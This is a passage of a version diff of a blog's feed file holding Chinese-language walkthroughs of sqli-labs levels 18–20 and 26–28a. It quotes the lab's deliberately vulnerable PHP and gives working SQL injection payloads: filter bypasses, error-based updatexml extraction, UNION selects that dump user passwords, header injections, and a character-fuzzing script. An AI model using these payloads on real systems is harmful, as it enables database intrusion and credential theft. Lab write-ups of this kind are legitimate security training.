-<h3 id="26-or-and-空格和斜杠被过滤"><a href="#26-or-and-空格和斜杠被过滤" class="headerlink" title="26 or/and/*/-/#/空格和斜杠被过滤"></a>26 <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span>     </span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br><span class="line">        </span><br><span class="line"><span class="comment">#good,this can use:%09</span></span><br><span class="line"><span class="comment">#good,this can use:%0a</span></span><br><span class="line"><span class="comment">#good,this can use:%0b</span></span><br><span class="line"><span class="comment">#good,this can use:%0c</span></span><br><span class="line"><span class="comment">#good,this can use:%0d</span></span><br><span class="line"><span class="comment">#good,this can use:%20</span></span><br><span class="line"><span class="comment">#good,this can use:%22</span></span><br><span class="line"><span class="comment">#good,this can use:%23</span></span><br><span class="line"><span class="comment">#good,this can use:%27</span></span><br><span class="line"><span class="comment">#good,this can use:%2a</span></span><br><span class="line"><span class="comment">#good,this can use:%2d</span></span><br><span class="line"><span class="comment">#good,this can use:%2f</span></span><br><span class="line"><span class="comment">#good,this can use:%5c</span></span><br></pre></td></tr></table></figure>
-
-<p><code>%20(空格)、%23(#)、%2a(*)、%2d(-)、%2f(/)、%5c(\)，%09-%0d都是制表符、换行符、换页符</code></p>
-<p>但是这个题在linux环境下可以解析<code>%a0</code>windows下就无法解析</p>
-<p>这一关有三种注入方式:</p>
-<ul>
-<li>union select 联合注入，用特殊编码符代替空格</li>
-<li>报错注入，为了避开空格，选择使用<code>updatexml()</code>和<code>extractvalue()</code></li>
-<li>Bool盲注，构造避开空格的语句</li>
-</ul>
-<p>使用<code>||</code>替换<code>and</code></p>
-<p><code>?id=1&#39;||&#39;1&#39;=&#39;1</code></p>
-<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
-<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
-<br>
-
-<h3 id="26a-or-and-空格和斜杠被过滤"><a href="#26a-or-and-空格和斜杠被过滤" class="headerlink" title="26a  or/and/*/-/#/空格和斜杠被过滤"></a>26a  <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>?id=1&#39;)||(&#39;1&#39;=&#39;1</code></p>
-<br>
-
-<br>
-
-<h3 id="27-空格-union-select被过滤"><a href="#27-空格-union-select被过滤" class="headerlink" title="27 */-/#/空格/*/union/select被过滤"></a>27 <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>?id=0%27%a0unIon%a0sElect%a01,2,%273</code></p>
-<p><code>?id=0%27%a0unIon%a0sElect%a01,(sElect%a0group_concat(password)from%a0users)%20,%273</code></p>
-<br>
-
-<br>
-
-<h3 id="27a-空格-union-select被过滤"><a href="#27a-空格-union-select被过滤" class="headerlink" title="27a */-/#/空格/*/union/select被过滤"></a>27a <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>?id=1&quot; ||&quot;1&quot;=&quot;1</code> 双引号闭合</p>
-<p><code>?id=0%22%20UnIon%a0SeLect%a01,2,3%22</code></p>
-<p><code>?id=0%22%20UnIon%a0SeLect%a01,(SeLect%a0group_concat(password)from%a0users),3%22</code></p>
-<br>
-
-<h3 id="28-空格-union-select被过滤"><a href="#28-空格-union-select被过滤" class="headerlink" title="28*/-/#/+/空格/union/select被过滤"></a>28<code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span> <span class="operator">&amp;</span> SELECT.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>
-
-<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
-<br>
-
-<h3 id="28a-空格-union-select被过滤"><a href="#28a-空格-union-select被过滤" class="headerlink" title="28a */-/#/+/空格/union/select被过滤"></a>28a <code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
-]]></content>
-      <categories>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>SQLi</tag>
-      </tags>
   </entry>
   <entry>
     <title>sqli-labs3</title>
@@ -1764,6 +1625,145 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs2</title>
+    <url>/posts/63ba4580/</url>
+    <content><![CDATA[<h3 id="18-UA注入"><a href="#18-UA注入" class="headerlink" title="18 UA注入"></a>18 UA注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p><code>check_input()</code>函数先截取前20位，</p>
+<p>如果开启GPC,去掉反斜杠，</p>
+<p>如果是十进制，有非法字符再转译掉</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          print_r(mysql_error());            </span><br><span class="line">          echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          </span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">          print_r(mysql_error());</span><br><span class="line">          ... ... </span><br></pre></td></tr></table></figure>
+
+<p>这里对<code>username</code>和<code>password</code>做了处理，但没有对<code>UA</code>处理 这里使用UA·</p>
+<p>burp suite抓包改UA <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
+<h3 id="19-Referer注入"><a href="#19-Referer注入" class="headerlink" title="19 Referer注入"></a>19 Referer注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br></pre></td></tr></table></figure>
+
+<p>改Referer <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
+<h3 id="20-Cookie注入"><a href="#20-Cookie注入" class="headerlink" title="20 Cookie注入"></a>20 Cookie注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">    $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">    $cookee <span class="operator">=</span> $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, <span class="type">time</span>()<span class="operator">+</span><span class="number">3600</span>);    </span><br><span class="line">            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Cookie is: &#x27;</span> .$cookee;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>改Cookie </p>
